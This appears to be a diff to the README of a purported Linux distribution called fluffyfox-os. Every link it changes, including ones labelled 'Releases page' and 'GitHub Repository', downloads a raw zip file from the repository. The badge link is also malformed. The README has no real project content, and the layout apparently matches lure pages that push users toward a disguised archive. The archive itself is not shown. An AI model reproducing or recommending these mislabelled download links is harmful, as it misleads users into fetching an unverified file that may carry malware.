@@ -6,11 +6,11 @@ Welcome to fluffyfox-os! This is a unique Linux distribution built for users who
 
 ## 📥 Download the Latest Release
 
-[![Download Now](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip)
+[![Download Now](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip)
 
 To get started, visit the Releases page to download the latest version of fluffyfox-os:
 
-[Download fluffyfox-os](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip)
+[Download fluffyfox-os](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip)
 
 ## 🛠️ Requirements
 
@@ -29,11 +29,11 @@ You will need a USB flash drive or a DVD to create an installation medium. Ensur
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip) to find the latest version.
+Go to the [Releases page](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip) to find the latest version.
 
 ### Step 2: Choose Your Version
 
-Find the version you want, and click on the corresponding download link. You will usually see files named like `https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip`.
+Find the version you want, and click on the corresponding download link. You will usually see files named like `https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip`.
 
 ### Step 3: Create Installation Media
 
@@ -84,8 +84,8 @@ Your feedback is important to us. If you have suggestions for improvements or fe
 
 ## 🖱️ Important Links
 
-- [Releases Page](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip) - Download the latest version.
+- [Releases Page](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip) - Download the latest version.
 - [Community Forums](#) - Join discussions and get help from other users.
-- [GitHub Repository](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/system/fluffyfox_os_v3.2-beta.4.zip) - Explore the code and contribute.
+- [GitHub Repository](https://raw.githubusercontent.com/Anasali312/fluffyfox-os/main/files/os-fluffyfox-1.2.zip) - Explore the code and contribute.
 
 Enjoy your journey with fluffyfox-os! We hope you find this distribution to be a great fit for your needs.
